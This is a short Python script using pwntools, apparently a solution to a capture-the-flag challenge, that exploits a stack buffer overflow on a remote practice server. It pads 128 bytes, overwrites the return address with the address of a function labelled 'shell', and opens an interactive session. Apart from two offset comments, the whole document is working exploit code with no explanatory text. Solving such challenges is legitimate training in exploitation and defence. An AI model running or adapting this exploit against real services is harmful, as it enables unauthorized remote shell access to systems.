from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3001)
#0x8C-0xC=0x80(128bytes)
payload = b"A"*128
#shell=0x0804849b
payload+=p32(0x0804849b)
p.sendline(payload)
p.interactive()
